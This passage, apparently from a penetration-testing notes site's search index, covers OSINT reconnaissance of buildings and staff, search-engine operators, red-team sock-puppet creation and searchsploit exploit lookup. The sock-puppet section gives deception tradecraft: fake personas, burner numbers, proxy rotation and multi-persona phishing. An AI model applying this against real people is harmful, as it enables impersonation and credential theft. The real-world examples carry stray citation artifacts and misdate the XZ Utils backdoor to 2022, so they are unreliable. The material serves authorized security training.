<code>Vimeo</code>, stock footage websites, and social media posts from employees or visitors who may have flown a personal drone nearby.</li> <li>Information Gained:<ul> <li>Roof Access: Identifying HVAC units, hatches, and other potential entry points on the roof.</li> <li>Security Patrols: Observing guard patterns or vehicle routes if captured in the footage.</li> <li>Line of Sight: Understanding what is visible from different angles around the property.</li> </ul> </li> </ul>"},{"location":"osint/passive-recon/#3-building-layout","title":"3. Building Layout","text":"<p>You can often piece together a building's internal and external layout without ever going inside.</p> <ul> <li>Objective: To understand the flow of the building, locate sensitive areas, and identify security mechanisms.</li> <li>Sources:<ul> <li>Public Records: Searching for publicly filed building permits or architectural plans.</li> <li>Marketing Materials: Company websites often have virtual tours, photo galleries, or videos that reveal the lobby, office spaces, and more.</li> <li>Employee Photos: As detailed below, photos posted by employees can reveal immense detail about the interior.</li> </ul> </li> <li>Information Gained:<ul> <li>Access Control: Location of badge readers, security desks, and keycard-protected doors.</li> <li>Employee congregation spots: Identifying break areas, cafeterias, or smoking areas which are ideal for social engineering.</li> <li>Security Presence: Pinpointing the location of internal security cameras and guard posts.</li> <li>Perimeter Details: Getting a closer look at fencing, gates, and locks.</li> </ul> </li> </ul>"},{"location":"osint/passive-recon/#job-information","title":"Job Information \ud83e\uddd1\u200d\ud83d\udcbc","text":"<p>The employees of a company are often the weakest link. Gathering detailed information about them is essential for phishing, vishing, and impersonation attacks.</p>"},{"location":"osint/passive-recon/#1-employee-details","title":"1. Employee Details","text":"<p>The goal is to build a comprehensive employee directory to map out the organizational structure.</p> <ul> <li>Objective: To identify key personnel, their roles, and contact information.</li> <li>Sources: <code>LinkedIn</code> (the primary source), the company's own \"Team\" or \"About Us\" pages, professional networking sites, and data from previous breaches.</li> <li>Information Gained:<ul> <li>Names and Job Titles: Identifying high-value targets like System Administrators, HR personnel, or C-level executives.</li> <li>Contact Info: Finding corporate email addresses and sometimes phone numbers.</li> <li>Organizational Structure: Determining who reports to whom (managers) to craft more believable phishing emails (e.g., an email that appears to come from a manager to their direct report).</li> </ul> </li> </ul>"},{"location":"osint/passive-recon/#2-picture-analysis","title":"2. Picture Analysis","text":"<p>Photos voluntarily posted by employees are a goldmine of intelligence.</p> <ul> <li>Objective: To extract sensitive information from images posted on public social media profiles or in news articles.</li> <li>Sources: <code>LinkedIn</code>, <code>Facebook</code>, <code>Instagram</code>, <code>Twitter</code>, company blogs, and press releases.</li> <li>Information Gained:<ul> <li>Badge Photos: A high-resolution profile picture can often reveal the entire layout and design of a company ID badge, making forgery much easier.</li> <li>Desk Photos: An employee's picture of their desk can reveal the computer model, operating system, applications they use, sticky notes with passwords, and even their phone extension.</li> <li>Ambient Information: Photos from inside the office can show the type of computers used, network ports, whiteboard notes, and internal posters or documents.</li> <li>EXIF Data: The metadata embedded in an image file can sometimes contain GPS coordinates, revealing exactly where the photo was taken.</li> </ul> </li> </ul>"},{"location":"osint/search-engine-operators/","title":"Search Engine Operators for OSINT","text":"<p>Search engine operators are specialized commands or symbols used to refine search queries, making them invaluable for Open-Source Intelligence (OSINT) tasks. These operators allow precise filtering, exclusion, or targeting of information, such as specific sites, file types, or proximity-based searches. Below is a detailed guide on operators for Google, Bing, Yandex, DuckDuckGo, and Baidu, tailored for OSINT purposes. Each section includes a table of key operators, their syntax, descriptions, and examples, based on official documentation and reliable sources.</p>"},{"location":"osint/search-engine-operators/#google-search-operators","title":"Google Search Operators","text":"<p>Google's operators are robust for OSINT, enabling targeted searches across domains, file types, or cached pages. Use Google's Advanced Search (https://www.google.com/advanced_search) for a GUI or the search bar for direct queries.</p> Operator Syntax Description Example AND (implicit) term1 term2 Finds pages with both terms (default). biking Italy OR term1 OR term2 Finds pages with either term. recycle steel OR iron \" \" \"exact phrase\" Searches for exact phrase. \"I have a dream\" - term1 -term2 Excludes pages with term2. salsa -dance ~ ~term Includes synonyms. castle ~glossary * term1 * term2 Wildcard for word(s) between terms. \"a * saved is a * earned\" define: define: term Provides definitions from the web. define: imbroglio + - * / number operator number Performs arithmetic. 12 + 34 - 56 * 7 / 8 % of number % of number Calculates percentages. 45% of 39 ^ or ** number^number or number**number Raises to a power. 2^5 site: site:domain Restricts to a specific site/domain. halloween site:www.census.gov .. number1..number2 Searches numerical range. dave barry pirate 2002..2006 filetype: or ext: filetype:type Limits to file types. form 1098-t irs filetype:pdf link: link:URL Finds pages linking to URL. link:warriorlibrarian.com cache: cache:URL Shows cached page version. cache:www.irs.gov related: related:URL Finds similar pages. related:www.healthfinder.gov info: or id: info:URL Provides page info. info:www.theonion.com allinanchor: allinanchor:keywords All terms in anchor text. allinanchor:seo tips allintext: allintext:keywords All terms in body text. allintext:seo blog allintitle: allintitle:keywords All terms in title. allintitle:seo blog allinurl: allinurl:keywords All terms in URL. allinurl:seo blog AROUND(n) term1 AROUND(n) term2 Terms within n words. seo AROUND(3) audit book or books book term Searches book text. book ender's game movie: movie: title Finds movie reviews/showtimes. movie: traffic stocks: stocks: ticker Shows stock info. stocks: goog weather weather location Shows weather forecast. weather seattle wa <p>OSINT Use Case: Use <code>site:</code>, <code>filetype:pdf</code>, or <code>link:</code> to uncover documents or connections on specific domains. <code>cache:</code> helps retrieve deleted or altered pages.</p>"},{"location":"osint/search-engine-operators/#bing-search-operators","title":"Bing Search Operators","text":"<p>Bing's operators are effective for OSINT, especially for SEO diagnostics and link analysis. They focus on site restrictions and file types.</p> Operator Syntax Description Example contains: contains:type Finds pages linking to file type. site:yourdomain.com contains:pdf ext: ext:type Limits to file extension. ext:htm feed: feed:term Finds RSS/Atom feeds. feed:seo hasfeed: hasfeed:term Finds pages with feeds. hasfeed:seo info: info:URL Shows page info, including related results. info:competitorsite.com inanchor: inanchor:keyword Keyword in anchor text. inanchor:seo inbody: inbody:keyword Keyword in body text. inbody:seo intitle: intitle:keyword Keyword in title. intitle:seo ip: ip:address Sites hosted on an IP. ip:192.0.2.1 language: language:code Limits to language. language:en location: location:country Limits to region. location:us OR term1 OR term2 Either term (capitalized). john doe (site:linkedin OR site:twitter) prefer: prefer:keyword Emphasizes term. seo prefer:audit site: site:domain Restricts to domain. site:bruceclay.com page experience update url: url:domain Checks if domain is indexed. url:bruceclay.com - term1 -term2 Excludes term. cats -musical \" \" \"exact phrase\" Exact match. \"search engine optimization\" () (group) Groups terms for complex queries. (seo OR sem) audit filetype: filetype:type Limits to file type. filetype:pdf seo <p>OSINT Use Case: <code>ip:</code> and <code>contains:</code> are powerful for mapping sites hosted on specific servers or finding linked documents.</p>"},{"location":"osint/search-engine-operators/#yandex-search-operators","title":"Yandex Search Operators","text":"<p>Yandex, widely used in Russia, offers precise operators for OSINT, including proximity and exact-form searches, ideal for regional investigations.</p> Operator Syntax Description Example + term1 +term2 Includes term explicitly. audit +seo - term1 -term2 Excludes term (at query end). seo -audit \" \" \"exact phrase\" Exact phrase match. \"mobile seo audit\" * term1 * term2 Wildcard for missing words (with \"\"). \"the best seo *\" term1 term2 ~~ term1 ~~term2 NOT; excludes term entirely. seo ~~audit ~ term1 ~term2 Excludes term from same sentence. seo ~audit ! !term Exact form, no synonyms. !seos !! !!term Dictionary form. !!seo &amp; term1 &amp; term2 Terms in same sentence. free &amp; seo /+n term1 /+n term2 Terms within n words (right). seo /+2 audit /-n term1 /-n term2 Terms within n words (left). audit /-2 seo /(x y) term1 /(x y) term2 Terms within range x (left) to y (right). seo /(-3 +3) audit () (group) Groups complex queries. seo &amp;&amp; (+audit url: url:address Exact URL search. url:seosly.com inurl: inurl:term Term in URL. inurl:seo site: site:domain Restricts to site/subdomains. site:seosly.com domain: domain:TLD Restricts to TLD. seo domain:com host: host:www.domain.tld Specific host. host:www.seosly.com rhost: rhost:tld.domain.www Reverse host (with * for subs). rhost:com.seosly.www title: title:term Term in title. title:seo audit mime: mime:type File type limit. seo mime:pdf lang: lang:code Language limit. seo lang:en date: date:YYYYMMDD Date limit (with * for partial). date:202408* <p>OSINT Use Case: <code>rhost:</code>, <code>mime:</code>, and <code>/+n</code> are excellent for mapping subdomains, finding files, or narrowing proximity searches in Russian-language contexts.</p>"},{"location":"osint/search-engine-operators/#duckduckgo-search-operators","title":"DuckDuckGo Search Operators","text":"<p>DuckDuckGo, privacy-focused, offers simple operators for OSINT, with \"bangs\" (! ) redirecting queries to other platforms.</p> Operator Syntax Description Example term1 term2 term1 term2 OR logic by default. cats dogs \" \" \"exact phrase\" Exact phrase. \"cats and dogs\" ~\" \" ~\"phrase\" Semantically similar phrases (experimental). ~\"cats and dogs\" - term1 -term2 Reduces presence of term2. cats -dogs + term1 +term2 Increases presence of term2. cats +dogs filetype: term filetype:ext Limits to file type. cats filetype:pdf site: term site:domain Restricts to domain. dogs site:example.com -site: term -site:domain Excludes domain. cats -site:example.com intitle: intitle:term Term in title. intitle:dogs inurl: inurl:term Term in URL. inurl:cats \\ \\term Goes to first result. \\futurama !bang !bang term Searches on another site. !a blink182 (Amazon) !safeon/off term !safeon Toggles safe search. cats !safeon <p>OSINT Use Case: Use <code>!bang</code> to pivot to platforms like LinkedIn or Twitter, and <code>filetype:</code> to locate public documents.</p>"},{"location":"osint/search-engine-operators/#baidu-search-operators","title":"Baidu Search Operators","text":"<p>Baidu, dominant in China, supports operators optimized for Chinese-language OSINT, with functionality similar to Google.</p> Operator Syntax Description Example intitle: intitle:term Term in title. intitle:university site: site:domain Restricts to domain. site:seomandarin.com inurl: inurl:term Term in URL. inurl:wikipedia \" \" \"exact phrase\" Exact match. \"seo service\" filetype: filetype:ext Limits to file type. filetype:doc - term1 -term2 Excludes term. seo -fred + term1 +term2 Includes term. \u4e2d\u56fd\u523a\u7ee3 +\u5386\u53f2 AND term1 AND term2 Both terms. \u4e2d\u56fd AND \u523a\u7ee3 OR term1 OR term2 Either term. \u4e2d\u56fd OR \u523a\u7ee3 <p>OSINT Use Case: Combine <code>site:</code> and <code>filetype:</code> to find Chinese-language documents or use <code>inurl:</code> for targeted URL searches.</p>"},{"location":"osint/sock-puppet/","title":"Sock Puppets","text":"<p>In red-teaming and penetration testing, sock puppets are fictitious online personae used to mask the tester\u2019s real identity and simulate adversary social-engineering tactics. By blending seamlessly into target environments\u2014social media platforms, internal forums, or industry-specific networks\u2014they provide access to information and human responses that purely technical means cannot reach.</p>"},{"location":"osint/sock-puppet/#objectives","title":"Objectives","text":"<ul> <li>Assess Human Vulnerabilities through tailored phishing or pretexting campaigns.  </li> <li>Test Security Controls such as email filters, monitoring, and identity verification.  </li> <li>Gather Covert Intelligence from closed groups or restricted channels.  </li> <li>Simulate Real-World Attacks like targeted spear-phishing or multi-persona impersonation.  </li> </ul>"},{"location":"osint/sock-puppet/#planning-scoping","title":"Planning &amp; Scoping","text":"<p>Before building any sock puppet, define clear engagement parameters and obtain written authorization outlining allowed tactics and targets. Determine which platforms (LinkedIn, Facebook, Slack workspaces, etc.) your personas must infiltrate based on the target\u2019s digital footprint. Establish success criteria\u2014for example, click-through rates on phishing links or depth of forum information extracted.</p> <pre><code>flowchart TD\n  A[Define Objectives] --&gt; B[Select Platforms]\n  B --&gt; C[Scope &amp; Authorization]\n  C --&gt; D[Plan Persona Types]\n  D --&gt; E[Allocate Resources]\n  E --&gt; F[Execute Setup]</code></pre>"},{"location":"osint/sock-puppet/#persona-crafting","title":"Persona Crafting","text":"<ol> <li>Identity Blueprint </li> <li>Generate realistic names and demographics using tools like Fake Name Generator.  </li> <li> <p>Align age, occupation, and interests to the platform\u2019s typical user base.</p> </li> <li> <p>Profile Imagery </p> </li> <li>Use AI-generated faces from ThisPersonDoesNotExist.com to avoid reverse-image detection.  </li> <li> <p>Scrub image metadata before upload.</p> </li> <li> <p>Backstory &amp; Consistency </p> </li> <li>Draft a multi-paragraph bio outlining education, career history, and hobbies.  </li> <li>Seed early posts or interactions that reflect those interests (forum comments, retweets).</li> </ol>"},{"location":"osint/sock-puppet/#account-setup-enrichment","title":"Account Setup &amp; Enrichment","text":"<ul> <li>Email Addresses: Register through privacy-focused providers (ProtonMail, Tutanota) without phone verification.  </li> <li>Phone Verification: Obtain burner SIMs (e.g., Mint Mobile trial) with a VPN-spoofed location.  </li> <li>Social Graph Building:  </li> <li>Connect with peripheral users first (industry alumni groups, open forums).  </li> <li>Gradually add high-value targets once the account appears seasoned.  </li> <li>Cross-Platform Consistency: Use the same backstory across LinkedIn, Twitter, and GitHub for cohesion.</li> </ul>"},{"location":"osint/sock-puppet/#operational-security-opsec","title":"Operational Security (OPSEC)","text":"<ul> <li>Isolated Environments: Run all sock-puppet work inside dedicated VMs or separate hardware to prevent bleed-over.  </li> <li>Network Anonymity: Always use reputable VPNs or proxy chains matching your persona\u2019s claimed locale.  </li> <li>Artifact Sanitization: Regularly clear cookies, local storage, and cached credentials.  </li> <li>Logging &amp; Documentation: Keep encrypted logs of interactions, credentials, and IP rotations for post-engagement review.</li> </ul>"},{"location":"osint/sock-puppet/#deployment-infiltration-techniques","title":"Deployment &amp; Infiltration Techniques","text":""},{"location":"osint/sock-puppet/#spear-phishing-via-trusted-persona","title":"Spear-Phishing via Trusted Persona","text":"<p>Use a puppet posing as a recruiter or partner to send personalized invitations and follow-ups, leveraging prior reconnaissance to reference shared connections or projects.</p>"},{"location":"osint/sock-puppet/#closed-group-recon","title":"Closed-Group Recon","text":"<p>After joining invite-only forums, observe discussion threads for keywords, then chime in with helpful commentary to build rapport.</p> <pre><code>sequenceDiagram\n  actor Operator\n  participant PersonaA\n  participant PersonaB\n  participant Target\n\n  Operator-&gt;&gt;PersonaA: Send connection request\n  PersonaA-&gt;&gt;Target: Endorse for a skill (engagement)\n  Operator-&gt;&gt;PersonaB: Introduce via DM\n  PersonaB-&gt;&gt;Target: Share 'relevant' resource link</code></pre>"},{"location":"osint/sock-puppet/#advanced-multi-persona-attacks","title":"Advanced Multi-Persona Attacks","text":"<p>In Multi-Persona Impersonation (MPI), multiple sock puppets interact publicly to simulate an organic conversation, increasing credibility before a final malicious action (e.g., payload delivery). Rotate each persona\u2019s IP and device fingerprint via proxy pools to reduce correlation risk. Stagger login times and activity patterns to mimic realistic behavior across time zones.</p>"},{"location":"osint/sock-puppet/#real-world-examples","title":"Real-World Examples","text":""},{"location":"osint/sock-puppet/#example-1-ta453-multi-persona-impersonation-september-2022","title":"Example 1: TA453 Multi-Persona Impersonation (September\u00a02022)","text":"<p>In mid-2022, the Iran-aligned group TA453 deployed Multi-Persona Impersonation on email threads, CC\u2019ing multiple fake personas to exploit social proof and lure targets into malicious OneDrive links containing credential-harvesting macros \ue200cite\ue202turn0search0\ue201 \ue200cite\ue202turn0search3\ue201.</p>"},{"location":"osint/sock-puppet/#example-2-xz-utils-supply-chain-tampering-april-2022","title":"Example 2: XZ Utils Supply-Chain Tampering (April\u00a02022)","text":"<p>Attackers used sock-puppet developer accounts on GitHub to submit benign-looking code updates to XZ Utils, later embedding a backdoor (\u201cXZ Trojan\u201d) that executed on Linux systems relying on the library \ue200cite\ue202turn0search4\ue201 \ue200cite\ue202turn0search6\ue201.</p>"},{"location":"osint/sock-puppet/#example-3-facebook-catfishing-campaign-20212022","title":"Example 3: Facebook Catfishing Campaign (2021\u20132022)","text":"<p>Multiple sock-puppet profiles on Facebook posed as industry professionals to befriend U.S. military and defense personnel, sharing malware-laden links before Facebook\u2019s takedown, illustrating long-term credential theft efforts \ue200cite\ue202turn0search1\ue201 \ue200cite\ue202turn0search3\ue201.</p>"},{"location":"osint/sock-puppet/#example-4-lazarus-group-linkedin-recruiting-scam-february-2025","title":"Example 4: Lazarus Group LinkedIn Recruiting Scam (February\u00a02025)","text":"<p>North Korea\u2019s Lazarus Group crafted fake LinkedIn recruiter profiles offering crypto-related job roles, harvesting CVs or GitHub links, then delivering obfuscated scripts that dynamically loaded info-stealing malware targeting developer environments \ue200cite\ue202turn1search0\ue201 \ue200cite\ue202turn1search3\ue201.</p>"},{"location":"osint/sock-puppet/#example-5-ghost-network-inflating-github-repository-popularity","title":"Example 5: Ghost Network Inflating GitHub Repository Popularity","text":"<p>A clandestine network of over 3,000 sock-puppet GitHub accounts (\u201cStargazer Goblin\u201d) automated stars and forks to boost malicious repositories\u2019 visibility, distributing Windows malware through community trust mechanisms \ue200cite\ue202turn0news75\ue201 \ue200cite\ue202turn1search6\ue201.</p>"},{"location":"osint/sock-puppet/#detection-mitigation","title":"Detection &amp; Mitigation","text":"<p>Blue teams can flag sock puppets by correlating: - Writing Patterns: Stylometry and writing inconsistencies. - Behavioral Anomalies: Unrealistic activity bursts or connection patterns. - Technical Indicators: Shared IPs, OS fingerprints, or reused profile images.  </p> <p>Implement AI-driven detection tools to cluster suspicious accounts by behavioral similarity and alert on potential sock-puppet networks.</p>"},{"location":"osint/sock-puppet/#ethical-legal-considerations","title":"Ethical &amp; Legal Considerations","text":"<ul> <li>Written Consent: Always operate under signed agreements detailing scope and methods.  </li> <li>Privacy Compliance: Avoid harvesting personal data beyond engagement parameters.  </li> <li>Transparency &amp; Reporting: Document each step so findings can be independently verified.  </li> <li>Scope Adherence: Do not extend personas beyond the engagement or for real-world fraud.</li> </ul>"},{"location":"osint/sock-puppet/#useful-references","title":"Useful References:","text":"<ul> <li>Creating an Effective Sock Puppet for OSINT Investigations \u2013 Introduction</li> <li>The Art Of The Sock</li> <li>Reddit - My process for setting up anonymous sockpuppet accounts</li> <li>Fake Name Generator</li> <li>This Person Does not Exist</li> <li>Privacy.com</li> </ul>"},{"location":"osint/sock-puppet/#conclusion","title":"Conclusion","text":"<p>By meticulously planning, crafting authentic personae, maintaining strict OPSEC, employing layered infiltration tactics, and learning from real-world breaches, red teams can simulate sophisticated adversaries, expose human-centric vulnerabilities, and strengthen organizational security postures.</p>"},{"location":"web-application-pentest/public_exploit/","title":"Public Exploits","text":"<p>Once we identify the services running on ports identified from our Nmap scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like SSH or ftp.</p>"},{"location":"web-application-pentest/public_exploit/#finding-public-exploits","title":"Finding Public Exploits","text":"<p>Many tools can help us search for public exploits for the various applications and services we may encounter during the enumeration phase. One way is to Google for the application name with <code>exploit</code> to see if we get any results.</p> <p>A well-known tool for this purpose is searchsploit, which we can use to search for public vulnerabilities/exploits for any application. We can install it with the following command:</p> <pre><code>sudo apt install exploitdb -y\n</code></pre> <p>Then, we can use <code>searchsploit</code> to search for a specific application by its name, as follows:</p> <pre><code>\u250c\u2500\u2500(elodvk\u327fkali)-[~/htb-academy]\n\u2514\u2500$ searchsploit openssh 7.2\n--------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                         |  Path\n--------------------------------------------------------------------------------------- ---------------------------------\nOpenSSH 2.3 &lt; 7.7 - Username Enumeration                                               | linux/remote/45233.py\nOpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC)                                         | linux/remote/45210.py\nOpenSSH 7.2 - Denial of Service                                                        | linux/dos/40888.py\nOpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                | multiple/remote/39569.py\nOpenSSH 7.2p2 - Username Enumeration                                                   | linux/remote/40136.py\nOpenSSH &lt; 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privil | linux/local/40962.txt\nOpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading                               | linux/remote/40963.txt\nOpenSSH &lt; 7.7 - User Enumeration (2)                                                   | linux/remote/45939.py\nOpenSSHd 7.2p2 - Username Enumeration                                                  | linux/remote/40113.txt\n--------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre>"},{"location":"win-priv-esc/getting-started/","title":"Introduction to Windows Privilege Escalation","text":"<p>to be published soon!</p>"},{"location":"blog/archive/2025/","title":"2025","text":""}]}